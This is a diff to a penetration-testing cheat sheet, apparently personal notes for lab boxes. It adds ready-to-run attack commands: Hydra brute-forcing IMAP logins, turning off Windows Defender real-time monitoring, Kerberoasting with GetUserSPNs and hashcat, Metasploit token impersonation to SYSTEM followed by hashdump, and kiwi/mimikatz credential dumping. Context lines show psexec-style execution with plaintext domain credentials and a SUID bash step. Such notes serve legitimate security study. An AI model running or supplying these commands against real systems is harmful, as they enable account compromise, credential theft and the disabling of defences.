@@ -135,13 +135,16 @@ chmod +s /bin/bash
 > 1. if everything goes well, you should see "+OK"
 > 1. in redis run command: system.exec "id" and you should see "id" command output
 
-#### SSH Port forwarding local service 8080
-> using **socat** for local port forwarding. In this example port 8080 is running locally and we will forward and make it public to 8089.\
-> socat TCP-LISTEN:8089,fork TCP:127.0.0.1:8080
-
 #### wpscan commands
 > 1.  ``` wpscan -e ap --rua --disable-tls-checks --detection-mode aggressive --plugins-detection aggressive -k --url https://xxx.xxx ```
 
+#### IMAP brute force via Hydra
+> 1. ``` hydra -I -S -v -L 300_smtp_users -P wordlist.txt -s 993 -F -f 10.10.10.10 imap -V```
+	
+#### SSH Port forwarding local service 8080
+> using **socat** for local port forwarding. In this example port 8080 is running locally and we will forward and make it public to 8089.\
+> socat TCP-LISTEN:8089,fork TCP:127.0.0.1:8080
+	
 #### Local --- SSH Port forwarding local service 5901 (VNC) - HackMyVM Box Level
 > 1. using SSH (Kali IP: 192.168.10.100, Level IP: 192.168.10.11).\
 > 1. there is a service running on port 5901 locally.\
@@ -434,6 +437,10 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 > 1. FW on --- ```netsh advfirewall set currentprofile state on```
 > 1. FW off --- ```netsh advfirewall set currentprofile state off```
 
+##### Disable Windows Defender from CMD
+> 1. ``` powershell -ep bypass ```
+> 1. ``` Set-MpPreference -DisableRealtimeMonitoring $true ```
+	
 ##### Windows RDP from CMD
 > 1. enable --- ```reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f```
 > 1. disable --- ```reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f```
@@ -480,8 +487,24 @@ trator```
 > 1. ```smbexec.py MARVEL.local/fcastle:Password1@192.168.10.25``` **[doesnt works with defender ON]**
 > 1. ```wmiexec.py MARVEL.local/fcastle:Password1@192.168.10.25``` **[doesnt works with defender ON]**	
 
+#### Kerberoasting
+> 1. GetUserSPNs.py thedomain.com/fmasood:strongpassword -dc-ip 10.10.10.200 -request
+> 1. hashcat -a 0 -m 13100 -w 2 kerberoating.request.hash rockyou.txt
 	
-					    
+#### Token Impersonation w.r.t to AD
+> 1. get MSF session
+> 1. load incognito
+> 1. help incognito
+> 1. list_tokens -u
+> 1. impersonate_token "impersonate_token "NT AUTHORITY\\SYSTEM""
+> 1. hashdump
+> 1. rev2self (to get back to orignal)
+
+#### Credentials dumping via KIWI/Mimikatz w.r.t to AD
+> 1. get MSF session
+> 1. load kiwi
+> 1. help kiwi
+> 1. creds_all (etc. try other commands)
 	
 #### Misc. 	
 ##### Ubuntu WSL2 on Windows 10 - SSH portforwarding to access it via Public IP
